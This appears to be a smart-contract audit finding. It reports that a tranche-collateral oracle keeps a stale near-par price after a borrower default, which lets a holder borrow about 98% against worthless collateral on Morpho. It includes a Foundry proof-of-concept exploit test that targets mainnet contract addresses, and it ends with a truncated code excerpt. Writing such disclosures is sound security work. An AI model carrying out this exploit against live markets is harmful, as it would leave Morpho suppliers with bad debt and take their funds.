### Title
Stale tranche collateral price remains active after borrower default - (File: `contracts/strategies/morpho/TranchesChainlinkOracle.sol`)

### Summary
`TranchesChainlinkOracle.latestRoundData()` always reports `IdleCDO.virtualPrice()` and does not check whether the credit vault has entered the `defaulted` state. [1](#0-0)  When borrower repayment fails, `_handleBorrowerDefault()` marks the pool as defaulted and disables further operations, but the CDO still holds the nominal strategy-token balance used by `virtualPrice()`. [2](#0-1) [3](#0-2)  The oracle therefore continues valuing tranche collateral at approximately its pre-default price until `finalizeDefault()` crystallizes the loss. [4](#0-3) 

### Finding Description
The deployed Morpho market uses the tranche token as collateral with a 98% LLTV and obtains its price through `TranchesChainlinkOracle`. [5](#0-4)  Morpho's adapter only consumes the `answer` field, so the zero timestamps returned by the adapter do not provide an additional freshness check. [6](#0-5) 

After an honest borrower fails to repay, `stopEpoch()` catches the failed transfer and calls `_handleBorrowerDefault()`. [7](#0-6) [8](#0-7)  That function sets `defaulted = true` and disables withdrawals, but does not burn or reprice the CDO-held strategy tokens. [2](#0-1)  Consequently, `virtualPrice()` continues to treat the strategy-token claims as approximately fully backed until the privileged `finalizeDefault()` call invokes `finalizeDefaultRecovery()` and reduces the active balance. [9](#0-8) 

An ordinary tranche holder can exploit the interval between the successful `stopEpoch()` transaction that records the default and the subsequent `finalizeDefault()` transaction by supplying the stale-priced tranche tokens to Morpho and borrowing nearly 98% of their nominal value.

### Impact Explanation
At 98% LLTV, collateral valued at the stale par price can borrow approximately `0.98 * collateral` underlying. [10](#0-9)  If the defaulted borrower provides no recovery, finalization reduces the tranche collateral price to zero while the attacker retains the borrowed assets, leaving Morpho suppliers with nearly the full borrowed amount as bad debt. [11](#0-10)  With partial recovery, the loss is approximately `borrowed - collateral * defaultRecoveryPrice / 1e18`, up to the available market liquidity.

### Likelihood Explanation
The attacker only needs to be a pre-existing tranche-token holder; no privileged or malicious borrower behavior is required. [12](#0-11)  A failed borrower repayment is a normal protocol state transition, and the vulnerable pricing interval is created automatically because the default flag does not alter `virtualPrice()` or disable the oracle. [2](#0-1)  Existing donation skimming and deposit pauses do not prevent an existing collateral holder from opening the Morpho borrow during that interval. [13](#0-12) 

### Recommendation
Make the adapter default-aware. For credit-vault deployments, return zero, or otherwise a finalized recovery-adjusted price, while `IdleCDOEpochVariant.defaulted()` is true and `IdleCreditVault.defaultRecoveryFinalized()` is false. After finalization, resume reporting `virtualPrice()` so partial recovery is reflected. Alternatively, have the CDO expose an explicit collateral-safe price function that returns zero for unresolved defaults and emergency shutdown states. Do not rely on `latestRoundData` timestamps, because the Morpho oracle adapter only reads the answer. [6](#0-5)

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {DeployMetamorphoVault} from "../forge-scripts/DeployMetamorphoVault.s.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCDOTranche} from "../contracts/IdleCDOTranche.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IMorpho} from "../contracts/interfaces/morpho/IMorpho.sol";
import {IMorphoChainlinkOracleV2} from "../contracts/interfaces/morpho/IMorphoChainlinkOracleV2.sol";

interface IKeyringWhitelist {
    function setWhitelistStatus(address entity, bool status) external;
}

contract StaleDefaultOraclePoC is Test, DeployMetamorphoVault {
    uint256 internal constant FORK_BLOCK = 22525130;
    address internal constant CDO = 0xf6223C567F21E33e859ED7A045773526E9E3c2D5;
    address internal constant KEYRING = 0x6351370a1c982780Da2D8c85DfedD421F7193Fa5;
    address internal constant AA_TRANCHE = 0x45054c6753b4Bce40C5d54418DabC20b070F85bE;

    function testBorrowAgainstStaleDefaultedTranche() external {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        IdleCDOEpochVariant cdo = IdleCDOEpochVariant(CDO);
        IdleCreditVault creditVault = IdleCreditVault(cdo.strategy());
        IdleCDOTranche collateralToken = IdleCDOTranche(AA_TRANCHE);
        IERC20Detailed loanToken = IERC20Detailed(LOAN_TOKEN);

        address attacker = makeAddr("attacker");
        address lender = makeAddr("lender");
        address manager = creditVault.manager();
        address borrower = creditVault.borrower();

        // Acquire AA tranche collateral as an ordinary KYC-passing lender.
        vm.prank(TL_MULTISIG);
        IKeyringWhitelist(KEYRING).setWhitelistStatus(attacker, true);

        uint256 depositAmount = 1_000_000e6;
        deal(LOAN_TOKEN, attacker, depositAmount);
        vm.startPrank(attacker);
        loanToken.approve(CDO, type(uint256).max);
        cdo.depositAA(depositAmount);
        vm.stopPrank();

        // Deploy the production-style tranche oracle and Morpho market.
        (IMorpho.MarketParams memory params,) =
            _initializeTrancheMarket(AA_TRANCHE);
        IMorpho morpho = MORPHO;
        IMorphoChainlinkOracleV2 oracle =
            IMorphoChainlinkOracleV2(params.oracle);

        uint256 collateral = collateralToken.balanceOf(attacker);
        uint256 borrowAmount = collateral * 98 / 100;

        // A permissionless lender supplies borrowable liquidity.
        deal(LOAN_TOKEN, lender, depositAmount);
        vm.startPrank(lender);
        loanToken.approve(address(morpho), type(uint256).max);
        morpho.supply(params, depositAmount, 0, lender, "");
        vm.stopPrank();

        // Collateralize before the borrower default is externally visible.
        vm.startPrank(attacker);
        collateralToken.approve(address(morpho), type(uint256).max);
        morpho.supplyCollateral(params, collateral, attacker, "");
        vm.stopPrank();

        // Ensure an epoch is running.
        if (!cdo.isEpochRunning()) {
            vm.prank(manager);
            cdo.startEpoch();
        }
        vm.warp(cdo.epochEndDate() + 1);

        // Simulate borrower insolvency. The borrower remains honest; it simply
        // cannot satisfy the required repayment.
        deal(LOAN_TOKEN, borrower, 0);

        // stopEpoch succeeds externally, catches the failed repayment, and sets
        // defaulted = true.
        vm.prank(manager);
        cdo.stopEpoch(0, 0);
        assertTrue(cdo.defaulted());

        // The oracle still reports an approximately par collateral value.
        uint256 stalePrice = oracle.price();
        assertGt(stalePrice, 0.95e36);

        // The attacker borrows against the defaulted collateral.
        uint256 attackerBalanceBefore = loanToken.balanceOf(attacker);
        vm.prank(attacker);
        morpho.borrow(params, borrowAmount, 0, attacker, attacker);
        assertEq(
            loanToken.balanceOf(attacker),
            attackerBalanceBefore + borrowAmount
        );

        // Finalization with no recovery crystallizes the loss and drops the
        // collateral value to zero, leaving the borrow as bad debt.
        vm.prank(manager);
        cdo.finalizeDefault(0, address(0));
        assertEq(oracle.price(), 0);
    }
}

  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();

    if (!paused()) {
      _pause();
    }

    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;
